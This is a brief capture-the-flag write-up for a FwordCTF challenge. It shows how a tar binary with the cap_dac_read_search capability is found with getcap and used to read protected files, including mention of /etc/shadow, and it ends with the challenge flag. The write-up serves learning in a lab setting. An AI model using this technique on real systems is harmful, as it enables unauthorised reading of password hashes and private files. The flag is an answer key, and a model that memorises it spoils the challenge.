# CapiCapi - bash

when connecting to the service i tried most of the common priv esc techniques but none worked however. After being triggered for hours because it wasn't sudo -l i read the briefing again. I then googled the briefing and after quite a bit of endless googling found something called linux capabilities that could be exploited. I ended up finding this website about it:

[https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

After running the check to see if this could be exploited on our system:

```text
user1@d963015da1fa:/$ getcap -r / 2>/dev/null    <-- command we run  
/usr/bin/tar = cap_dac_read_search+ep <-- our response
```

this shows the same thing as the website so we know it should be able to be exploited.

We see that the binary tar has the privelages to read anything on the file system.

We attempt the example on /etc/shadow just like in the website and then go on to do the same thing on the flag.txt file:

```text
user1@d963015da1fa:/tmp$ tar -cvf flag.tar /home/user1/flag.txt
tar: Removing leading `/' from member names
/home/user1/flag.txt
user1@d963015da1fa:/tmp$ tar -xvf flag.tar
```

We then go into the `/tmp/home/user1` directory and read the `flag.txt` file

## Flag: FwordCTF{C4pAbiLities\_4r3\_t00\_S3Cur3\_NaruT0\_0nc3\_S4id}

